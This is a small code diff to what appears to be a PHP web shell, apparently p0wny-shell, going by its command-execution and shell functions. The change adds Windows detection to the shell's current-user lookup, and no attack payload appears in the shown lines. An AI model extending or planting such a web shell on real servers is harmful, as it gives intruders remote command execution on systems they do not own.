@@ -53,6 +53,10 @@ function executeCommand($cmd) {
     return $output;
 }
 
+function isRunningWindows() {
+    return stripos(PHP_OS, "WIN") === 0;
+}
+
 function featureShell($cmd, $cwd) {
     $stdout = "";
 
@@ -78,7 +82,7 @@ function featureShell($cmd, $cwd) {
 }
 
 function featureCurrentUser() {
-    $username = posix_getpwuid(posix_geteuid())['name'];
+    $username = isRunningWindows() ? getenv('USERNAME') : posix_getpwuid(posix_geteuid())['name'];
     if ($username === false) {
         $username = "p0wny";
     }
